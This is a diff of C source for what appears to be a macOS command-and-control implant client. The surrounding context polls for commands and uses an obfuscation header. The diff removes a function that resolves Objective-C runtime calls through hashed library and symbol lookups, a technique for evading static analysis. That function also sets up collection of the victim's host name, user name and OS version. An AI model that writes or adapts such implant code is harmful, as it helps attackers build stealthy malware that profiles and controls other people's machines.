@@ -1,11 +1,11 @@
 #include "client.h"
 #include <CFNetwork/CFNetwork.h>
 #include <CoreFoundation/CoreFoundation.h>
+#include <runtime/darwin.h>
 #include <runtime/foundation.h>
 #include <runtime/kit.h>
 #include <runtime/messaging.h>
 #include <runtime/obf.h>
-#include <runtime/symbol_resolv.h>
 #include <runtime/xspring.h>
 #include <stdbool.h>
 #include <stdio.h>
@@ -235,54 +235,6 @@ static bool check_for_commands(ClientContext* ctx) {
     free(command);
   }
 
-  return true;
-}
-
-bool InitializeDarwinApi(INSTANCE* instance) {
-  DEBUG_LOG("Starting API initialization");
-
-  // Get libobjc handle
-  void* objc = GetLibraryHandleH(getLibHash());
-  if (!objc) {
-    DEBUG_LOG("Failed to get libobjc handle");
-    return false;
-  }
-  DEBUG_LOG("Library handle obtained successfully: %p", objc);
-
-  // Initialize Objective-C runtime functions
-  instance->Darwin.objc_msgSend =
-      (objc_msgSend_t)GetSymbolAddressH(objc, getObjcMsgSendHash());
-  instance->Darwin.objc_getClass =
-      (objc_getClass_t)GetSymbolAddressH(objc, getObjcGetClassHash());
-  instance->Darwin.sel_registerName =
-      (sel_registerName_t)GetSymbolAddressH(objc, getSelRegisterNameHash());
-
-  if (!instance->Darwin.objc_msgSend || !instance->Darwin.objc_getClass ||
-      !instance->Darwin.sel_registerName) {
-    DEBUG_LOG("Failed to resolve basic Objective-C functions");
-    return false;
-  }
-
-  // Initialize system info classes and selectors
-  instance->Darwin.processInfoClass =
-      instance->Darwin.objc_getClass("NSProcessInfo");
-  instance->Darwin.processInfoSel =
-      instance->Darwin.sel_registerName("processInfo");
-  instance->Darwin.hostNameSel = instance->Darwin.sel_registerName("hostName");
-  instance->Darwin.userNameSel = instance->Darwin.sel_registerName("userName");
-  instance->Darwin.osVersionSel =
-      instance->Darwin.sel_registerName("operatingSystemVersionString");
-
-  // Cache process info instance
-  instance->Darwin.processInfo = instance->Darwin.objc_msgSend(
-      instance->Darwin.processInfoClass, instance->Darwin.processInfoSel);
-
-  if (!instance->Darwin.processInfo) {
-    DEBUG_LOG("Failed to get processInfo instance");
-    return false;
-  }
-
-  DEBUG_LOG("Successfully initialized all Darwin APIs");
   return true;
 }
 
